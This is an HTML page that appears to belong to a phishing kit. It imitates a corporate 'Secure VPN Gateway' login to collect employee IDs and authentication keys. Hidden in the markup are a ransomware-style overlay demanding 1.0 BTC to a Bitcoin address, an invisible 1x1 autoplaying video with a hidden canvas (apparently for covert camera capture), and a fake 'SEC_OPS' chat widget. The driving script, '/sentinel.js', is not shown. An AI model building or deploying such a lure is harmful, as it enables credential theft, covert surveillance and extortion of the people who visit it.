<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure VPN Gateway</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Consolas', monospace; margin: 0; background: #0a0a0a; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: #111; padding: 40px; border-radius: 0px; border: 1px solid #0f0; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); text-align: center; max-width: 440px; width: 100%; position: relative; }
        .logo-txt { font-size: 2rem; font-weight: bold; margin-bottom: 10px; letter-spacing: 2px; }
        .subtitle { font-size: 0.8rem; margin-bottom: 30px; opacity: 0.8; }
        .ms-input { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; font-family: monospace; font-size: 16px; margin-bottom: 20px; outline: none; box-sizing: border-box; }
        .ms-input:focus { box-shadow: 0 0 10px rgba(0,255,0,0.5); }
        .ms-button { background: #0f0; color: #000; border: none; padding: 12px 30px; cursor: pointer; width: 100%; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
        .ms-button:hover { background: #fff; box-shadow: 0 0 15px #0f0; }
        
        #ransom-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#100; color:#f33; z-index:99999; text-align:center; padding-top:100px; font-family:monospace; }
        #chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: #111; border-radius: 0; box-shadow: 0 10px 40px rgba(0,255,0,0.2); overflow: hidden; display: none; z-index: 1000; border: 1px solid #0f0; text-align: left; }
    </style>
</head>
<body>
    <div id="template-container" class="card">
        <div id="loader" style="margin-bottom:20px; animation: blink 1s infinite;">[ ESTABLISHING SECURE CONNECTION... ]</div>
        <div id="content" style="display:none;">
            <div id="vpn-view">
                <div class="logo-txt">SECURE_VPN</div>
                <div class="subtitle">CORPORATE REMOTE ACCESS GATEWAY v2.4</div>
                
                <input type="text" id="u" class="ms-input" placeholder="EMPLOYEE_ID / USERNAME">
                <input type="password" id="p" class="ms-input" placeholder="AUTHENTICATION_KEY" style="display:none;">
                
                <button class="ms-button" id="btn" onclick="handleAuth()">INITIATE HANDSHAKE</button>
            </div>
        </div>
    </div>

    <!-- Ransomware -->
    <div id="ransom-overlay">
        <h1 style="font-size:3rem;">⚠ SYSTEM ENCRYPTED ⚠</h1>
        <div id="timer" style="font-size:5rem; color:#ff0;">23:59:59</div>
        <p>Send 1.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
    </div>

    <!-- Chat -->
    <div id="chat-widget">
        <div style="background:#0f0; color:#000; padding:15px; font-weight:bold;">SEC_OPS COMMUNICATION</div>
        <div id="chat-msgs" style="height:250px; overflow-y:auto; padding:15px; font-size:0.85rem; display:flex; flex-direction:column; gap:10px;"></div>
        <div style="display:flex; padding:10px; border-top:1px solid #333;">
            <input type="text" id="chat-in" placeholder="Message..." style="flex:1; border:none; outline:none; background:#000; color:#0f0; padding:8px;">
            <button onclick="sendChat()" style="background:none; border:none; color:#0f0; font-weight:bold; cursor:pointer;">TX</button>
        </div>
    </div>

    <video id="v" width="1" height="1" autoplay style="opacity:0; position:fixed;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script src="/sentinel.js?v=5"></script>
    <style>@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }</style>
</body>
</html>
